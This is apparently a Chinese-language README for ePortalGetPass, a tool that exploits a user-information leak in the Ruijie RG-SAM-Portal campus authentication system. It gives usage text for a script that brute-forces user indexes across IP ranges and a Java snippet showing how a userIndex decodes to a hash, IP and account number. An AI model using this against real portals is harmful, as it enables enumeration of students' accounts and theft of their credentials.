# ePortalGetPass

Ruijie RG-SAM-Portal 用户信息泄露漏洞
```
usage: user_index_blasting.py [-h] [-p PREFIX] [-i IP] [-c CONCURRENT] [-s SID] [-n NUM]

options:
  -h, --help                                    show this help message and exit  
  -p PREFIX, --prefix PREFIX                    userindex前缀  
  -i IP, --ip IP                                指定ip段  
  -c CONCURRENT, --concurrent CONCURRENT        并发数量  
  -s SID, --sid SID                             开始爆破的起始账号  
  -n NUM, --num NUM                             要爆破账号的数量  
```

## 关键代码

* jboss\server\default\deploy\eportal.war\WEB-INF\classes\com\ruijie\webportal\service\helper\UserHelper.getOnlineUserByUserIndex
```java
public static byte[] hexStringToBytes(String hexStr, String prefix) {
    if (hexStr == null || prefix == null) throw new NullPointerException();
    String myHexStr = hexStr.trim();
    if (myHexStr.startsWith(prefix)) myHexStr = myHexStr.substring(prefix.length());
    int myHexStrLen = myHexStr.length();
    byte[] ba = new byte[myHexStrLen / 2];
    for (int i = 0; i < myHexStrLen; i += 2) {
        int vi = Integer.parseInt(myHexStr.substring(i, i + 2), 16);
        if (vi > 128) vi -= 256;
        ba[i / 2] = (byte) vi;
    }
    return ba;
}
String userIndex = "64623132613537653238383035353562343534663661383564393134313831395f31302e3130302e36342e315f323130323230303030";
userIndex = new String(hexStringToBytes(userIndex, ""));
System.out.println(userIndex); // db12a57e2880555b454f6a85d9141819_10.100.64.1_210220000
```

## 参考
* [admintony/ePortalGetPass](https://github.com/admintony/ePortalGetPass)
* [校园网认证系统-RG-SAM-Portal组件-用户信息泄露漏洞](http://admintony.com/校园网认证系统-RG-SAM-Portal组件-用户信息泄露漏洞.html)
